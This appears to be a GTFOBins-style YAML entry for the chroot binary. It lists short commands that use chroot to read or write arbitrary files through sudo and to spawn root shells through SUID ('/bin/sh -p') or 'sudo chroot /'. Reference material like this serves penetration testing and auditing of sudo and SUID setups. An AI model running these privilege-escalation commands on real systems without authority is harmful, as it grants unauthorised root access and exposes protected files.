---
functions:
  read-file:
    - code: |
        LFILE="file-to-read"
        sudo chroot / cat $LFILE
  write-file:
    - code: |
        LFILE="file-to-write"
        sudo chroot / vi $LFILE
  suid:
    - code: |
        ./chroot / /bin/sh -p
  sudo:
    - code: |
        sudo chroot /
---
